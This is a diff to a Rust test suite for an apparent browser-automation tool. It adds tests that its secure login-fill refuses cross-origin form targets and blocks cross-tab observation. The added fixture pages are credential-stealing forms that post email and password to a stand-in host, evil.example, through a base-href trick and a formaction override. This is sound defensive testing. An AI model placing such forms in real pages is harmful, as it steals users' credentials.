@@ -91,6 +91,37 @@ fn pages() -> HashMap<&'static str, String> {
             .to_string(),
     );
     pages.insert("/welcome", "<title>Welcome</title><h1>Welcome back</h1><a href=\"/login\">Sign out</a>".to_string());
+    pages.insert(
+        "/login-base-evil",
+        r#"<head><title>Base Evil</title><base href="https://evil.example/"></head>
+        <form action="steal" method="post">
+          <label>Email <input name="email" type="email"></label>
+          <label>Password <input name="password" type="password"></label>
+          <button type="submit">Continue</button>
+        </form>"#
+            .to_string(),
+    );
+    pages.insert(
+        "/login-formaction-evil",
+        r#"<title>FormAction Evil</title>
+        <form action="/welcome" method="post">
+          <label>Email <input name="email" type="email"></label>
+          <label>Password <input name="password" type="password"></label>
+          <button type="submit" formaction="https://evil.example/steal">Continue</button>
+        </form>"#
+            .to_string(),
+    );
+    pages.insert(
+        "/login-with-frame",
+        r#"<title>Login Frame</title>
+        <form action="/welcome" method="post">
+          <label>Email <input name="email" type="email"></label>
+          <label>Password <input name="password" type="password"></label>
+          <button type="submit">Continue</button>
+        </form>
+        <iframe src="/welcome" width="300" height="120"></iframe>"#
+            .to_string(),
+    );
     pages.insert("/slow-welcome", "<title>Welcome</title><h1>Welcome back</h1>".to_string());
     pages.insert("/slow-request", "waiting".to_string());
     pages.insert(
@@ -256,16 +287,88 @@ async fn secure_card_fills_the_login_document_and_waits_for_user_navigation() {
         .zip(["owner@example.test", "dummy-password"])
         .map(|(field, value)| (field.backend, field.input_type.clone(), value.to_string()))
         .collect();
-    session.fill_site_login("login", &inspected.tab, &inspected.frame, &inspected.loader, &inspected.origin, &fields).await.unwrap();
+    session.fill_site_login("login", &inspected.tab, &inspected.frame, &inspected.loader, &inspected.origin, &inspected.url, &fields).await.unwrap();
     assert_eq!(session.page(None).unwrap().loader, inspected.loader);
     assert!(session.snapshot(&SnapshotRequest::default()).await.is_err());
     assert!(session.wait(None, &WaitFor::Url("/login".into()), Duration::ZERO).await.is_err());
     assert!(act(&session, Action::Click, &ref_of(&opened.text, "button \"Continue\"")).await.is_err());
-    assert!(session.fill_site_login("login", &inspected.tab, &inspected.frame, &inspected.loader, &inspected.origin, &fields).await.is_err());
+    assert!(session.fill_site_login("login", &inspected.tab, &inspected.frame, &inspected.loader, &inspected.origin, &inspected.url, &fields).await.is_err());
 
     let recovered = session.navigate(None, &fx.url("/welcome"), false).await.unwrap();
     assert!(recovered.text.contains("Welcome back"), "{}", recovered.text);
     assert!(session.snapshot(&SnapshotRequest::default()).await.is_ok());
+}
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn secure_card_rejects_cross_origin_form_targets_and_blocks_cross_tab_frame_snapshot() {
+    let Some(fx) = Fixture::new().await else { return };
+    let session = fx.session().await;
+
+    // 1. `<base href="https://evil.example/">` redirects relative form action cross-origin -> refused.
+    let base_evil = session.navigate(None, &fx.url("/login-base-evil"), false).await.unwrap();
+    let refs = [ref_of(&base_evil.text, "textbox \"Email\""), ref_of(&base_evil.text, "textbox \"Password\"")];
+    let err = session.inspect_site_login(&refs).await.unwrap_err().to_string();
+    assert!(err.contains("different origin"), "{err}");
+
+    // 2. `<button formaction="https://evil.example/steal">` overrides form target cross-origin -> refused.
+    let fa_evil = session.navigate(None, &fx.url("/login-formaction-evil"), false).await.unwrap();
+    let refs = [ref_of(&fa_evil.text, "textbox \"Email\""), ref_of(&fa_evil.text, "textbox \"Password\"")];
+    let err = session.inspect_site_login(&refs).await.unwrap_err().to_string();
+    assert!(err.contains("different origin"), "{err}");
+
+    // 3. Cross-tab `snapshot { tab, frame }` and cross-tab `eval` are blocked while sensitive card is active.
+    let login = session.navigate(None, &fx.url("/login-with-frame"), false).await.unwrap();
+    let iframe_ref = ref_of(&login.text, "iframe");
+    let refs = [ref_of(&login.text, "textbox \"Email\""), ref_of(&login.text, "textbox \"Password\"")];
+    let inspected = session.inspect_site_login(&refs).await.unwrap();
+    let backends: Vec<_> = inspected.fields.iter().map(|f| f.backend).collect();
+    session.begin_sensitive_card("c_frame", &inspected.tab, &inspected.frame, &inspected.loader, &inspected.origin, &backends);
+
+    let other_tab = session.open_tab().await.unwrap();
+    let other_page = session.navigate(Some(&other_tab.id), &fx.url("/welcome"), false).await.unwrap();
+    let other_target = session.page(Some(&other_page.tab)).unwrap();
+    assert!(session.eval(&other_target, "1+1").await.is_err(), "cross-tab eval must be blocked");
+    assert!(
+        session
+            .snapshot(&SnapshotRequest {
+                tab: Some(other_page.tab.clone()),
+                frame: Some(iframe_ref.clone()),
+                ..SnapshotRequest::default()
+            })
+            .await
+            .is_err(),
+        "cross-tab snapshot with sensitive iframe ref must be blocked"
+    );
+    assert!(
+        session
+            .snapshot(&SnapshotRequest {
+                tab: None,
+                frame: Some(iframe_ref),
+                ..SnapshotRequest::default()
+            })
+            .await
+            .is_err(),
+        "default-tab snapshot targeting sensitive iframe ref must be blocked"
+    );
+    session.end_sensitive_card("c_frame");
+
+    // 4. Unseeded filled guard (reconnect adopt_pending timeout path) blocks same-origin observation
+    // and promotes to a document guard until the tab navigates to a new document.
+    session.mark_filled_unseeded(&inspected.tab, &inspected.origin);
+    assert!(session.has_active_sensitive());
+    assert!(
+        session
+            .snapshot(&SnapshotRequest {
+                tab: Some(inspected.tab.clone()),
+                ..SnapshotRequest::default()
+            })
+            .await
+            .is_err(),
+        "unseeded filled guard must block same-origin observation"
+    );
+    let after = session.navigate(Some(&inspected.tab), &fx.url("/welcome"), false).await.unwrap();
+    assert!(after.text.contains("Welcome back"), "{}", after.text);
+    assert!(!session.has_active_sensitive());
 }
 
 #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
